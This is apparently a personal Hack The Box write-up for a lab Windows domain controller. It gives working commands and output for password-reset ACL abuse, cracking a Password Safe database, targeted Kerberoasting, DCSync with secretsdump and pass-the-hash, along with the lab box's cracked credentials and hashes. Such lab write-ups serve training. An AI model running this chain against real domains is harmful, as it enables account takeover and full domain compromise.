---
created: 2025-08-26
---

📅 `2025-08-26`

#active-directory #bloodhound #change-password #ftp #password-vault #kerberoasting #dcsync

----

## 🖥️ Box Info

| ️🏷️ Name         |  `Administrator`    |
| --------------- | --- |
| 📆 Release Date |  `2024-11-09`   |
| 🌐 IP Address   | `10.10.11.42`    |
| 🖥️ OS           | `Windows`    |
| 🎯 Difficulty   |   `Medium`  |

----

## 🧠 Summary


**🧩 Key Concepts:** 

- Active Directory
- Assumed breach
- `BloodHound`
- Changing other users' passwords
- `Password Safe 3` password database
- `Kerberoasting`
- `DCSync`

**🛠️ Tools:**  

- `NetExec`
- `evil-winrm-py`
- `BloodHound`
- `PowerView`
- `Hashcat`

**📚 Learned:**  

- Try `FTP` on `NetExec`.
- Set fake `SPN` for `Kerberoasting`.
- `DCSync` with `NetExec`.

----

## 🌐 Port Scan

- **TCP**: [[Domain Controller Ports]], 21 (`FTP`)

---

## 👤 User

This machine is an assumed breach scenario, so we're given credentials. We have user `olivia` with password `ichliebedich`.

First, I looked for shares.

```shell
$ nxc smb 10.10.11.42 -u 'olivia' -p 'ichliebedich' --shares
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.42     445    DC               [+] administrator.htb\:
<SNIP>
```

There was nothing important. I enumerated `WinRM` and found `olivia` could `WinRM` into the machine, so I did that with `evil-winrm-py`, uploaded `sharphound` and ran it.

```shell
evil-winrm-py -i 10.10.11.42 -u Olivia -p ichliebedich
```

```shell
evil-winrm-py PS C:\Temp> upload /opt/sharphound/sharphound.exe ./
evil-winrm-py PS C:\Temp> dir C:\Temp

    Directory: C:\Temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/26/2025   4:15 AM          26139 20250826041526_BloodHound.zip
-a----         8/26/2025   4:15 AM           1428 NDI3ZmMyMGItNzc4Ny00MzE1LTllNDItYTM4YTEzYjcyZDFj.bin
-a----         8/26/2025   4:15 AM        1286656 sharphound.exe
```

I found this path:

![[Pasted image 20250826080134.png]]

![[Pasted image 20250826081446.png]]

User `olivia` can change user `michael`'s password and `michael` can change the password of `benjamin`, who is a member of the `Share Moderators` group. This group sounds interesting.

Let's load `PowerView` and change user `michael`'s password.

```shell
evil-winrm-py PS C:\Users\olivia\Documents> mkdir C:\Temp

    Directory: C:\


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
d-----         11/5/2026   2:11 PM                Temp                                                                  
evil-winrm-py PS C:\Users\olivia\Documents> cd C:\Temp


evil-winrm-py PS C:\Temp> loadps /opt/powershell-modules/powerview.ps1
[+] PowerShell script loaded successfully.
[*] New commands available (use TAB to autocomplete):
New-InMemoryModule, func, Add-Win32Type, psenum, field, struct, New-DynamicParameter, _temp, Get-IniContent, Export-PowerViewCSV, Resolve-IPAddress, ConvertTo-SID, ConvertFrom-SID, Convert-ADName, ConvertFrom-UACValue, Get-PrincipalContext, Add-RemoteConnection, Remove-RemoteConnection, Invoke-UserImpersonation, Invoke-RevertToSelf, Add-NetUser, Get-DomainSPNTicket, Invoke-Kerberoast, Get-PathAcl, Convert-FileRight, Convert-LDAPProperty, Get-DomainSearcher, Convert-DNSRecord, Get-Name, Get-DomainDNSZone, Get-DomainDNSRecord, Get-Domain, Get-DomainController, Get-Forest, Get-ForestDomain, Get-ForestGlobalCatalog, Get-ForestSchemaClass, Find-DomainObjectPropertyOutlier, Get-DomainUser, New-DomainUser, Set-DomainUserPassword, Get-DomainUserEvent, Get-DomainGUIDMap, Get-DomainComputer, Get-DomainObject, Get-DomainObjectAttributeHistory, Get-DomainObjectLinkedAttributeHistory, Set-DomainObject, Invoke-DowngradeAccount, ConvertFrom-LDAPLogonHours, ConvertTo-LogonHoursArray, New-ADObjectAccessControlEntry, Set-DomainObjectOwner, Get-DomainObjectAcl, Add-DomainObjectAcl, Remove-DomainObjectAcl, Find-InterestingDomainAcl, Get-DomainOU, Get-DomainSite, Get-DomainSubnet, Get-DomainSID, Get-DomainGroup, New-DomainGroup, Get-DomainManagedSecurityGroup, Get-DomainGroupMember, Get-DomainGroupMemberDeleted, Add-DomainGroupMember, Remove-DomainGroupMember, Get-DomainFileServer, Split-Path, Get-DomainDFSShare, Parse-Pkt, Get-DomainDFSShareV1, Get-DomainDFSShareV2, Get-GptTmpl, Get-GroupsXML, Get-DomainGPO, Get-DomainGPOLocalGroup, Get-DomainGPOUserLocalGroupMapping, Get-DomainGPOComputerLocalGroupMapping, Get-DomainPolicyData, Get-NetLocalGroup, Get-NetLocalGroupMember, Get-NetShare, Get-NetLoggedon, Get-NetSession, Get-RegLoggedOn, Get-NetRDPSession, Test-AdminAccess, Get-NetComputerSiteName, Get-WMIRegProxy, Get-WMIRegLastLoggedOn, Get-WMIRegCachedRDPConnection, New-GPOImmediateTask, Get-WMIRegMountedDrive, Get-WMIProcess, Find-InterestingFile, Test-Write, New-ThreadedFunction, Find-DomainUserLocation, Find-DomainProcess, Find-DomainUserEvent, Find-DomainShare, Find-InterestingDomainShareFile, Find-LocalAdminAccess, Find-DomainLocalGroupMember, Get-DomainTrust, Get-ForestTrust, Get-DomainForeignUser, Get-DomainForeignGroupMember, Get-DomainTrustMapping, Get-GPODelegation, Find-HighValueAccounts, Get-DomainRBCD, Set-DomainRBCD, Get-IdentityFilterString, Get-DomainDCSync, Get-DomainObjectSD, Set-DomainObjectSD, Get-DomainDN, Get-DomainLAPSReaders, Get-DomainEnrollmentServers, Get-DomainCACertificates, Get-DomainSQLInstances, Add-DomainAltSecurityIdentity, Invoke-LDAPQuery, Get-ObfuscatedFilterString, Get-RandomizedCasing, Convert-LogonHours, Get-RubeusForgeryArgs, Get-LogoffTime, Get-RegistryUserEnum, New-ThreadedFunction

evil-winrm-py PS C:\Temp> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
evil-winrm-py PS C:\Temp> Set-DomainUserPassword -Identity michael -AccountPassword $UserPassword
```

And it worked.

```shell
nxc smb 10.10.11.42 -u 'michael' -p 'Password123!'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:Password123!
```

Checking for `WinRM` access:

```shell
nxc winrm 10.10.11.42 -u 'michael' -p 'Password123!'

WINRM       10.10.11.42    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.10.11.42    5985   DC               [+] administrator.htb\michael:Password123! (Pwn3d!)
```

I logged in as `michael` and changed `benjamin`'s password.

```shell
evil-winrm-py -i 10.10.11.42 -u michael -p 'Password123!'
evil-winrm-py PS C:\Users\michael\Documents> loadps /opt/powershell-modules/powerview.ps1
evil-winrm-py PS C:\Users\michael\Documents> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
evil-winrm-py PS C:\Users\michael\Documents> Set-DomainUserPassword -Identity benjamin -AccountPassword $UserPassword
```

Apparently, user `benjamin` has no `SMB` or `WinRM` permissions, and the machine has no `RDP` enabled, but remember the machine has the `FTP` port open, and the group name hints it has something to do with moderating shared files. Let's try logging in via `FTP`.

>[!tip]
>If we can't log in as a user, think about what else that user may be able to do for us. Here, the machine had an `FTP` server listening, and the group name hinted that the user could access it.

```shell
nxc ftp 10.10.11.42 -u 'benjamin' -p 'Password123!'
FTP         10.10.11.42     21     10.10.11.42      [+] benjamin:Password123!
```

We have `FTP` access.

```shell
ftp 10.10.11.42
Name (10.10.11.42:asdf): benjamin
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49189|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
```

There's a backup file, so I downloaded it.

```shell
ftp> binary
200 Type set to I.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||49197|)
150 Opening BINARY mode data connection.
100% |**************************************************************************************************************************************************|   952        8.26 KiB/s    00:00 ETA
226 Transfer complete.
952 bytes received in 00:00 (8.25 KiB/s)
ftp> exit
221 Goodbye.
```

Now let's investigate this format.

The format is for the ["Password Safe"](https://pwsafe.org/) password manager. `.psafe3` is this manager's password database format. I installed it on my local Windows machine, and importing the database asks for a master password. I found we can use `hashcat` to crack this file's password. No need for a `*2john` binary.

```shell
hashcat -m 5200 Backup.psafe3 $ROCKYOU

<SNIP>

.\Backup.psafe3:tekieromucho

<SNIP>
```

The master password is `tekieromucho`.

>[!note]
>The password manager blocks screenshots of its `GUI`.

It has 3 users: `alexander`, `emily`, and `emma`. I copied these users' credentials to a file on my attack host.

```txt
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

Next, I tried to log in with them.

I attempted all 3 credentials with `NetExec` and only `emily` worked. I tested her credentials with `WinRM` too and she can `WinRM` into the machine.

```shell
nxc winrm 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)
```

Credentials:

- `emily`:`UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

And this user has the user flag:

```shell
evil-winrm-py PS C:\Users\emily> tree /F
Folder PATH listing
Volume serial number is 6131-DE70
C:.
+---3D Objects
+---Contacts
+---Desktop
¦       Microsoft Edge.lnk
¦       user.txt
¦
+---Documents
+---Downloads
<SNIP>
```

```shell
evil-winrm-py PS C:\Users\emily> cd Desktop
evil-winrm-py PS C:\Users\emily\Desktop> ls
    Directory: C:\Users\emily\Desktop
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         8/24/2025  10:30 PM             34 user.txt
evil-winrm-py PS C:\Users\emily\Desktop> cat user.txt
<REDACTED>
```

Got user flag.

---

## 🛡️ Privilege Escalation

Running more queries in `BloodHound`, I found that user `ethan` can perform `DCSync`, so this user may give us domain compromise.

![[Pasted image 20250826085946.png]]

I found this permission for user `emily`:

![[Pasted image 20250826083843.png]]

>[!tip]
>The "Outbound Object Control" section of the nodes can give important information.

The `GenericWrite` permission can be used to create a fake `SPN` for `Kerberoasting`, so I did exactly that.

```shell
evil-winrm-py PS C:\Users\emily\Documents> loadps /opt/powershell-modules/powerview.ps1
evil-winrm-py PS C:\Users\emily\Documents> Set-DomainObject -Identity ethan -SET @{serviceprincipalname='nonexistent/AAAA'}
```

And now let's retrieve the ticket.

```shell
nxc ldap 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoast output.txt --kerberoast-account ethan
LDAP        10.10.11.42    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.10.11.42    389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
LDAP        10.10.11.42    389    DC               [*] Total of records returned 1
<SNIP>

KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

And we get the error `KRB_AP_ERR_SKEW(Clock skew too great)`, caused by a mismatch between our system's clock and the target's. To fix it I used `rdate`. This tool can be used to set the system's date from a remote host with `NTP`. I installed the tool, disabled `NTP`, and matched the remote host's date.

```shell
sudo timedatectl set-ntp off
sudo rdate -n 10.10.11.42
Tue Aug 26 15:47:48 -05 2025
```

And now let's try again.

```shell
nxc ldap 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' --kerberoast output.txt --kerberoast-account ethan
LDAP        10.10.11.42    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.10.11.42    389    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 
LDAP        10.10.11.42    389    DC               [*] Total of records returned 1
LDAP        10.10.11.42    389    DC               [*] sAMAccountName: ethan, memberOf: [], pwdLastSet: 2024-10-12 15:52:14.117811, lastLogon: <never>
LDAP        10.10.11.42    389    DC               $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$d6b5754d04ae46ad004842e3137d1b07$484f38cf573fe9aeb0a0e9fec8e3b7776522440e3eafa3b709322dbef39c4376fc3dd799b627b23c2e620d537bb9e25ec99f39d5a8ea6f6e1404c6e6f3a331d7cfe166ad54cd11c057445d93ab9204c8b5d884c78859e1cdaad28d31ee6f72c606ed02fe2f3e2a1a6c3ab9dd09c35b090b7de83488d0ed8e76e2eff11a2aae88306e58b7137f1ae963ddbebdbacdacad0237fdb8c2df16d6a20bcdda8418de73e15a448fffd63165519a893b0fa8aba1df5d32929a432cc1df61a36a2f9cbae6a92fceb73b0544c58ccde80eca903f09cbff302c2eb5ba67c381ff56b08d41526e5ecab5bcc156561c7ad0b7815d64e620c006a18575d5daa684d955069fa205bc3ac68c260fa7db12dc69def87ba4cc41a522aa4f5e47c29fa769eb2b33c186d3bdeed5056ce406624450bd7e803cce204324d8ea1d190d80849fd842d8df8ec4746088b6e4758bebc11d21c65448da2ec5739d3804b0fcc6785a036b28af521ebc0e765b6938a3ce810d6e65e2ca41ae1f883882e36a9e7c6b533dfe2bee99b08207e10fa6c19c3df1318ccb70a41a328df5c854ffe050742ff5bf79f1d28ebbe99f4050506b3ea657dcb3df0be3d7d89f4855c7f1527c0e208204152b5de45a551c296e5fedd5ab446a0afb8c2897ff50e2fec16c2f2572b56d7605b915eb23f4770140ad45784e7ae6c43da49c13ae5dedda6f072b6c59d944bf75408d983b23d315283dc57f5ff587dbb1dbd61bf9b9d97825449a9e3103bbe73a84aeea54d1a8406bae921215f3c122c3d4e028dfe8449cd2f143dfd0f7e411675298d0ecf34372c33985ce204c8cca6072fa0512777b1a0f7dd2b66c96036fe27ed85f222fe41536885c951fa5fd772fa75075622dfbefa20dfae06d55f1531f81c18e1c209162f1836d00d8c230d8bae946737b5d65584960a8cd7ec70dbf1f4fbd80429ae87d8089449af98ae7a0280fb913fd4454482775b530337bd110e7cf778819e70a7c045c0bb33e71b0b44ee8c579abdfe78155d2bbc49136f953df578b11355d9c0087ae8644ba85f0ae7b5d87b690c2479ca837a6817fb356f23ccd54f9ca666d2cca233f25d9f0e7478c4e4ebe13befef6ad1a28c4703c4b0a2a92220825ec172d74d9b4874fe76496f61274b483e9f397ee477b45c7f0a68f630fa4a74976d6e7e58a3be153db30f5b335f66895ac7021daab2d4ecdf96bbd95bf6acf6781db0b34d99320b195b292d213143d120123968dd17e8bfab96c1e50701a00f54f9347cb55cac48a18a1ab29fe760f3682c5e49b2ab83043434f9312031c5ac5b813a9ceb541db0b6d510a031c10d728a51d810b2fb1a0099e34f7f38a46ff901f4fe001f47e29365d4a3e27d588498fd88661afaf459e650ae774372bb6a56c7719bcc6523eccf5c555c2c93d70b7f5e1f8be5551d5fec6b2b4938f13bc2115fc493cb9fd57f5a24692021eaae95dfaf1b5c0a276ff2a415353c36caaa20c51db9c9f2aef4c4ede142a72059e3482da9924807adc515c775cff014aca47
```

Let's clean up.

```shell
evil-winrm-py PS C:\Users\emily\Documents> Set-DomainObject -Identity ethan -Clear serviceprincipalname -Verbose
```


We got the ticket, which I cracked with `hashcat`.

```shell
hashcat output.txt $ROCKYOU

<SNIP>

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb\ethan*$0d...:limpbizkit

<SNIP>
```

And we got credentials for `ethan`.

- `ethan`:`limpbizkit`

```shell
nxc smb 10.10.11.42 -u 'ethan' -p 'limpbizkit'
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domin:administrator.htb) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit
```

Now I could run `DCSync`.

```shell
impacket-secretsdump administrator.htb/ethan:limpbizkit@DC.administrator.htb
/home/asdf/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
<SNIP>
```

And let's log in as administrator with the `NTLM` hash.

```shell
evil-winrm-py -i 10.10.11.42 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.7.0

[*] Connecting to '10.10.11.42:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> cd ../Desktop
evil-winrm-py PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name                                                                  
----                 -------------         ------ ----                                                                  
-ar---         11/5/2026   1:51 PM             34 root.txt                                                              


evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
<REDACTED>
```

Rooted.
